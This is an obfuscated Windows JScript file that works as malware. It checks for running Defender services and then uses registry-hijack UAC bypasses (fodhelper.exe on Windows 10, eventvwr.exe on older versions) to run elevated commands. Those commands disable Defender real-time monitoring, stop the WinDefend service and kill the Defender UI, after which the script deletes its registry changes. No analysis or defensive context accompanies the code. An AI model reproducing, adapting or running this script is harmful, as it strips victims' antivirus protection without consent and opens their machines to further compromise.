function getServiceStatus(name) {
  var znaxerv = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name='" + name + "'");
  wmgnwmm = new Enumerator(znaxerv);
  ipgmekrlzlc = wmgnwmm.item();
  var rpfienewfh = '';
  try {
    rpfienewfh = ipgmekrlzlc.State;
  } catch (e) {}
  if (rpfienewfh == 'Running') {
    return true;
  } else {
    return false;
  }
}
lnwvdivupynhof = '';
if (getServiceStatus('WdNisSvc')) {
  lnwvdivupynhof = 'WdNisSvc';
} else {
  if (getServiceStatus('WinDefend')) {
    lnwvdivupynhof = 'WinDefend';
  }
}
var amdiac = WScript.CreateObject("shell.application");
var zlrvcjg = new ActiveXObject("WScript.Shell");
var dhqjbo = GetObject("winmgmts:\\\\.\\root\\CIMV2");
var qpoyqecprmfq = dhqjbo.ExecQuery("SELECT * FROM Win32_OperatingSystem", "WQL", 0x10 | 0x20);
var kscpive = new Enumerator(qpoyqecprmfq);
var zrtkekm = kscpive.item();
var llkxvhpslfqw = zrtkekm.SystemDirectory;
var tamrvhtepo = zrtkekm.Version;
var arr = tamrvhtepo.split(".");
if (arr[0] == '10') {
  zlrvcjg.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\", 'cmd.exe /C "powershell Set-MpPreference -DisableRealtimeMonitoring $true && taskkill /im MSASCui* /f /t"', "REG_SZ");
  zlrvcjg.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute", "", "REG_SZ");
  amdiac.ShellExecute(llkxvhpslfqw + "\\fodhelper.exe", "", "", "open", 0);
  WScript.sleep(2000);
  amdiac.MinimizeAll();
  zlrvcjg.RegDelete("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\");
} else {
  if (arr[0] == '6') {
    zlrvcjg.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\", 'cmd.exe /C "sc stop WinDefend && taskkill /im MSASCui* /f /t"', "REG_SZ");
    amdiac.ShellExecute(llkxvhpslfqw + "\\eventvwr.exe", "", "", "open", 0);
    WScript.sleep(2000);
    zlrvcjg.RegDelete("HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\");
  }
}
var iii = 0;
while (true) {
  if (getServiceStatus(lnwvdivupynhof)) {
    WScript.sleep(100);
  } else break;
  iii = iii + 1;
  if (iii == 200) {
    break;
  }
}
